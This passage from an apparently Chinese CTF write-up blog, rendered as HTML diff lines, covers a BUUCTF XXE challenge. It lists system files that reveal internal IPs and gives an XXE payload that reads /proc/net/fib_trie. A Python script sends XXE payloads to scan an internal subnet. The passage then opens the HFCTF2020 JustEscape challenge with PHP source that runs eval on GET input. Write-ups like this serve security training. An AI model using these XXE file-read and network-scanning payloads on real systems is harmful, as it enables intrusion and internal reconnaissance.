class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>	&#125;	<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>	<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>看了其它师傅的<code>wp</code>，这里主要是用<code>XXE</code>进行内网扫描去找存活主机(可以探测内网)<code>https://xz.aliyun.com/t/3357#toc-11</code>。</p>
+<p>可能获取到内网ip的敏感文件：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>network/interfaces<br><span class="hljs-regexp">/etc/</span>hosts<br><span class="hljs-regexp">/proc/</span>net/arp<br><span class="hljs-regexp">/proc/</span>net/tcp<br><span class="hljs-regexp">/proc/</span>net/udp<br><span class="hljs-regexp">/proc/</span>net/dev<br><span class="hljs-regexp">/proc/</span>net/fib_trie<br></code></pre></td></tr></table></figure>
+
+<p>尝试：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/proc/net/fib_trie&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/xxewhat2.png" srcset="/img/loading.gif" lazyload alt="xxewhat2"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#参考：https://www.cnblogs.com/Article-kelp/p/16026652.html</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br>url=<span class="hljs-string">&quot;http://e28cd6e3-3ea2-4656-ae5c-e267a4e7b8cd.node4.buuoj.cn:81/doLogin.php&quot;</span><br>rawPayload=<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;!DOCTYPE user [&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://10.244.80.&#123;&#125;&quot;&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;]&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;user&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;username&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&amp;payload1;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/username&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;password&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;23&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/password&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/user&gt;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">256</span>):<br>    payload=rawPayload.<span class="hljs-built_in">format</span>(i)<br>    <span class="hljs-comment">#payload=rawPayload</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="hljs-built_in">format</span>(i),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        resp=res.post(url,data=payload,timeout=<span class="hljs-number">0.3</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(resp.text,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/xxewhat1.png" srcset="/img/loading.gif" lazyload alt="xxewhat1"></p>
+<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><img src="/img/hfctfjustescape1.png" srcset="/img/loading.gif" lazyload alt="hfctfjustescape1"></p>
+<p><code>/?run.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;code&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(code);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
 
                 
               </div>
